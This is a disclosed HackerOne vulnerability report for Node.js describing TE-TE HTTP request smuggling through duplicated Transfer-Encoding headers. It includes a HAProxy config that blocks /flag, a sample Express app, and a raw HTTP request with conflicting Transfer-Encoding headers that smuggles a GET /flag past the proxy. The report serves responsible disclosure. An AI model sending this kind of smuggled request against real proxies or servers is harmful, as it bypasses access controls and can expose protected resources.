# Potential HTTP Request Smuggling in nodejs

## Report Details
- **Report ID**: 1002188
- **URL**: https://hackerone.com/reports/1002188
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-10-08T05:24:20.378Z
- **Disclosed**: 2021-01-07T11:09:06.503Z

## Reporter
- **Username**: piao
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** 
Potential HTTP Request Smuggling exists in nodejs. Attacker can use two same header field make TE-TE HTTP Request Smuggling attack.

**Description:** 
nodejs allow same header field in a http request. for example, we can send two `Transfer-Encoding` header field, even if one of them is false header field. But nodejs only identify the first header field and ignore the after. This lead to a Potential HTTP Request Smuggling.

## Steps To Reproduce:
for example, using haproxy to make TE-TE attack:

haproxy 1.5.3 version haproxy.cfg
haproxy.cfg forbid access `/flag` URI
```
global
 daemon
 maxconn 256

defaults
 mode http
 timeout connect 5000ms
 timeout client 50000ms
 timeout server 50000ms

frontend http-in
 bind *:80
 default_backend servers
 acl url_403 path_beg -i /flag
 http-request deny if url_403

backend servers
 server server1 127.0.0.1:8080 maxconn 32
```

app.js
```
var express = require('express');
var app = express();
var bodyParser = require('body-parser')

app.use(bodyParser())

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.get('/flag', function (req, res) {
    res.send('flag is 1a2b3c4d5e6f');
});

app.post('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});
```

use this http request can bypass haproxy `/flag` restrict
```
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Transfer-Encoding: chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x


```

## Impact: 
It is possible to smuggle the request and disrupt the user experience.

## Supporting Material/References:
N/A

## Impact

It is possible to smuggle the request and disrupt the user experience.

## Attachments
No attachments
